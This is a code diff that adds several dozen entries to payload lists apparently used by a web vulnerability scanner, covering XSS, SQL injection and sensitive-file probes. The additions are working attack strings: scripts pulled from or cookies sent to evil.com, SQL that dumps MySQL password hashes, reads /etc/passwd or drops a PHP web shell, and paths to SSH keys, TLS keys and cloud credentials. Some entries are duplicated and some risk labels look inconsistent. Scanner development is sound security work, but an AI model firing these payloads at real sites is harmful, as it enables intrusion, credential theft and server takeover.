@@ -71,6 +71,30 @@ XSS_PAYLOADS = [
     {"payload": "<script>document.location='https://evil.com?cookie='+document.cookie</script>", "risk": "high"},  # XSS stealing cookies via document.location
     {"payload": "<input type='text' onfocus='alert(1)'>", "risk": "medium"},  # XSS triggered by onfocus event in text input
     {"payload": "<img src=x onerror=eval('alert(1)')>", "risk": "high"},  # XSS triggered by image error with eval()
+    {"payload": "\"><svg/onload=confirm(1)>", "risk": "high"},  # Short vector that closes attribute and injects SVG with onload
+    {"payload": "<script src=//evil.com/xss.js></script>", "risk": "high"},  # External script injection (blocked by CSP if present)
+    {"payload": "<math href='javascript:alert(1)'/>", "risk": "high"},  # Using MathML tag to trigger JS
+    {"payload": "<img src=x onerror='this.onerror=null;alert(1)'>", "risk": "high"},  # Prevents infinite loop for cleaner alert
+    {"payload": "<div onpointerover=alert(1)>Hover me</div>", "risk": "medium"},  # Uses newer pointerover event
+    {"payload": "<script>alert(document.domain)</script>", "risk": "medium"},  # Used to confirm domain access in XSS
+    {"payload": "<object type='text/x-scriptlet' data='http://evil.com/exploit.sct'></object>", "risk": "high"},  # Legacy Internet Explorer vector
+    {"payload": "<embed src='data:text/html,<script>alert(1)</script>'>", "risk": "high"},  # XSS using embed with data URL
+    {"payload": "<svg><a xlink:href='javascript:alert(1)'>Click</a></svg>", "risk": "high"},  # Using SVG xlink:href
+    {"payload": "<form><button formaction='javascript:alert(1)'>Click</button></form>", "risk": "medium"},  # XSS via button formaction
+    {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>", "risk": "high"},  # Parser confusion using nested script tags
+    {"payload": "<style>@keyframes x{}</style><div style='animation-name:x' onanimationstart='alert(1)'></div>", "risk": "medium"},  # CSS animation trigger for XSS
+    {"payload": "{{constructor.constructor('alert(1)')()}}", "risk": "high"},  # Template injection in JS engines (Angular, Handlebars)
+    {"payload": "<textarea><svg/onload=alert(1)></textarea>", "risk": "high"},  # Mutation XSS via sanitization bypass
+    {"payload": "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>", "risk": "high"},  # Base64-encoded script inside iframe
+    {"payload": "<img src=x oneonerror=alert(1)>", "risk": "medium"},  # Fake double event attribute bypass
+    {"payload": "<img\tsrc=x\tonerror=alert(1)>", "risk": "medium"},  # Tab-separated attribute to bypass filters
+    {"payload": "<svg><g onload=location='javascript:alert(1)'></g></svg>", "risk": "high"},  # JS protocol inside SVG tag
+    {"payload": "<svg onload=alert(1)//", "risk": "medium"},  # Incomplete tag with valid onload execution
+    {"payload": "<object data='data:text/html,<script>alert(1)</script>'></object>", "risk": "high"},  # Object with embedded data URL
+    {"payload": "<script\x00>alert(1)</script>", "risk": "high"},  # Null byte injection attempt
+    {"payload": "<!--<script>alert(1)</script>-->", "risk": "low"},  # Comment-wrapped script for debugging or bypass
+    {"payload": "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "risk": "high"},  # srcdoc-based inline script injection
+    {"payload": "<form action='javascript:alert(1)'><input type=submit></form>", "risk": "medium"}  # Form action using javascript protocol
 ]
 
 
@@ -132,6 +156,42 @@ SQLI_PAYLOADS = [
     {"payload": "' UNION SELECT NULL, table_name FROM information_schema.tables -- ", "risk": "medium"},  # List tables from information schema
     {"payload": "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "medium"},  # List columns from 'users' table
     {"payload": "' OR 1=1; SELECT * FROM mysql.db -- ", "risk": "high"},  # Get MySQL database privileges
+    {"payload": "' AND 1=1 -- ", "risk": "low"},  # General boolean test to check SQLi presence
+    {"payload": "' OR 'a'='a' -- ", "risk": "low"},  # Classic tautology for SQLi testing
+    {"payload": "' AND '1'='1' -- ", "risk": "low"},  # Basic tautology test
+    {"payload": "' AND 1=0 -- ", "risk": "low"},  # False condition for behavior testing
+    {"payload": "' AND EXISTS(SELECT 1) -- ", "risk": "low"},  # Safe existence check
+    {"payload": "' OR EXISTS(SELECT 1) -- ", "risk": "low"},  # Detects SQLi by checking query behavior
+    {"payload": "' OR 1=1; SELECT column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "low"},  # List columns
+    {"payload": "' OR 1=1; SELECT table_name FROM information_schema.tables -- ", "risk": "low"},  # List tables in DB
+    {"payload": "' OR 1=1; SELECT schema_name FROM information_schema.schemata -- ", "risk": "medium"},  # Enumerate schemas
+    {"payload": "' UNION SELECT NULL, database(), user() -- ", "risk": "medium"},  # Leak current DB and user
+    {"payload": "' UNION SELECT NULL, table_name FROM information_schema.tables -- ", "risk": "medium"},  # Enumerate tables
+    {"payload": "' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- ", "risk": "medium"},  # Columns in users table
+    {"payload": "' AND ASCII(SUBSTRING(@@version,1,1))>50 -- ", "risk": "medium"},  # Blind SQLi test
+    {"payload": "' AND SLEEP(3) -- ", "risk": "medium"},  # Time-based SQLi detection
+    {"payload": "' OR 1=1; SELECT COUNT(*) FROM information_schema.tables -- ", "risk": "medium"},  # Get table count
+    {"payload": "' OR 1=1; SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema -- ", "risk": "medium"},  # DB structure overview
+    {"payload": "' OR 1=1; SELECT user, host, authentication_string FROM mysql.user -- ", "risk": "high"},  # Dump MySQL user credentials
+    {"payload": "' OR (SELECT file_priv FROM mysql.user WHERE user='root' LIMIT 1)='Y' -- ", "risk": "high"},  # Check FILE privilege
+    {"payload": "' OR 1=1; SHOW GRANTS FOR CURRENT_USER() -- ", "risk": "high"},  # Show user privileges
+    {"payload": "' OR 1=1; SELECT LOAD_FILE('/etc/passwd') -- ", "risk": "high"},  # Read system file
+    {"payload": "' OR 1=1; SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php' -- ", "risk": "high"},  # Web shell drop
+    {"payload": "' OR (SELECT super_priv FROM mysql.user WHERE user = CURRENT_USER() LIMIT 1) = 'Y' -- ", "risk": "high"},  # SUPER privilege check
+    {"payload": "' OR 1=1; SELECT name, dl FROM mysql.func -- ", "risk": "high"},  # UDF injection check
+    {"payload": "' OR 1=1; SELECT * FROM information_schema.triggers -- ", "risk": "high"},  # Triggers enumeration
+    {"payload": "' OR 1=1; SELECT routine_name FROM information_schema.routines WHERE routine_type='PROCEDURE' -- ", "risk": "high"},  # Stored procedures
+    {"payload": "' OR 1=1; SELECT grantee, privilege_type FROM information_schema.user_privileges -- ", "risk": "high"},  # User privileges
+    {"payload": "' OR 1=1; SELECT * FROM information_schema.events -- ", "risk": "high"},  # Scheduled events
+    {"payload": "' OR 1=1; SHOW VARIABLES LIKE 'general_log_file' -- ", "risk": "high"},  # Path to general log file
+    {"payload": "' OR 1=1; SELECT engine, support FROM information_schema.engines -- ", "risk": "high"},  # DB engines used
+    {"payload": "' OR 1=1; SHOW VARIABLES -- ", "risk": "high"},  # Full DB configuration dump
+    {"payload": "' OR 1=1; SELECT * FROM information_schema.plugins -- ", "risk": "high"},  # Plugin enumeration
+    {"payload": "' OR 1=1; SHOW BINARY LOGS -- ", "risk": "high"},  # Binary logs listing
+    {"payload": "' OR 1=1; SHOW ENGINE INNODB STATUS -- ", "risk": "high"},  # InnoDB internals leak
+    {"payload": "' OR 1=1; SELECT @@basedir -- ", "risk": "high"},  # MySQL base directory
+    {"payload": "' OR 1=1; SELECT @@version_compile_os -- ", "risk": "high"},  # OS used to compile DB
+    {"payload": "' OR 1=1; SELECT * FROM mysql.db -- ", "risk": "high"} # MySQL DB privilege listing
 ]
 
 
@@ -225,5 +285,37 @@ SENSITIVE_FILES = [
     {"payload": "/LICENSE", "risk": "low"},  # Open-source license text
     {"payload": "/COPYING", "risk": "low"},  # GNU license or similar
     {"payload": "/robots.txt", "risk": "low"},  # Sitemap and crawl directives
+    {"payload": "/humans.txt.bak", "risk": "low"},  # Backup of humans.txt, purely cosmetic
+    {"payload": "/version.txt", "risk": "low"},  # May disclose framework/CMS version
+    {"payload": "/info", "risk": "low"},  # Often an API health check or about endpoint
+    {"payload": "/readme.txt", "risk": "low"},  # Duplicate of README.md in different format
+    {"payload": "/site.webmanifest", "risk": "low"},  # PWA metadata
+    {"payload": "/.editorconfig", "risk": "low"},  # Code formatting rules, reveals dev tools
+    {"payload": "/index.php.bak", "risk": "low"},  # Backup of main page, can reveal older logic
+    {"payload": "/.well-known/change-password", "risk": "low"},  # Defined path for password reset flow
+    {"payload": "/status", "risk": "low"},  # Often used for uptime checks
+    {"payload": "/login", "risk": "low"},  # Public login endpoint, good for brute-force checks
+    {"payload": "/debug.log", "risk": "medium"},  # Root-level debug log file
+    {"payload": "/.bashrc", "risk": "medium"},  # User shell config, may reveal paths or commands
+    {"payload": "/app/.env.production", "risk": "medium"},  # Production-specific env file
+    {"payload": "/local.settings.json", "risk": "medium"},  # Azure Functions settings, may expose secrets
+    {"payload": "/server/config.xml", "risk": "medium"},  # Generic config in XML format
+    {"payload": "/database.sql", "risk": "medium"},  # Possible raw DB dump
+    {"payload": "/config.js", "risk": "medium"},  # May contain frontend keys or settings
+    {"payload": "/logs/debug.log", "risk": "medium"},  # Application debug log
+    {"payload": "/tmp/error.log", "risk": "medium"},  # Generic error output file
+    {"payload": "/setup.php", "risk": "medium"},  # May initialize database or expose setup logic
+    {"payload": "/id_rsa", "risk": "high"},  # Private SSH key, full remote access if valid
+    {"payload": "/.azure/credentials.json", "risk": "high"},  # Azure SDK/service credentials
+    {"payload": "/.circleci/config.yml", "risk": "high"},  # CI/CD config may expose deployment secrets
+    {"payload": "/.dockerenv", "risk": "high"},  # Indicates container, may help escape or escalate
+    {"payload": "/config/database.yml", "risk": "high"},  # Rails DB config, often with credentials
+    {"payload": "/.n8n/config", "risk": "high"},  # Workflow automation tool secrets/API keys
+    {"payload": "/srv/ftp/ftpusers", "risk": "high"},  # May expose valid FTP users
+    {"payload": "/etc/pki/tls/private/localhost.key", "risk": "high"},  # Private key for TLS
+    {"payload": "/config/secrets.yml", "risk": "high"},  # Rails secret token used to sign cookies
+    {"payload": "/.credentials/oauth.json", "risk": "high"}  # OAuth credentials file (e.g., Google APIs)
+
+
     
 ]
